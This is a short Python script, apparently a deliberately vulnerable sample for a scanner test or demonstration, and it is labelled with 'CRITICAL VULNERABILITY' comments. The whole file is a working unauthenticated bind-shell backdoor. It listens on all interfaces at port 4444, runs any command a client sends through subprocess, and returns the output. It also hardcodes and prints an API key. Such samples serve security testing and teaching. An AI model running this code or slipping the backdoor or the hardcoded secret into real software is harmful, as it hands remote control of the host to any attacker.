import socket
import subprocess
import os

# 🚨 CRITICAL VULNERABILITY 1: Hardcoded API Key
API_KEY = "sk-CRITICAL-EXPOSED-KEY-999999"

# 🚨 CRITICAL VULNERABILITY 2: Remote Code Execution (Unauthenticated Backdoor)
def handle_client(client_socket):
    while True:
        # Receive command from attacker
        command = client_socket.recv(1024).decode("utf-8")

        if command.lower() == "exit":
            break

        # 🚨 EXECUTES COMMAND WITHOUT SANITIZATION (RCE)
        output = subprocess.getoutput(command)

        # Send back command output
        client_socket.send(output.encode("utf-8"))

# Open a backdoor server
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(("0.0.0.0", 4444))  # Listens on all interfaces, port 4444
server.listen(5)

print(f"🚨 Backdoor listening on port 4444... API Key: {API_KEY}")

while True:
    client, addr = server.accept()
    print(f"🔥 Connection received from {addr}")
    handle_client(client)
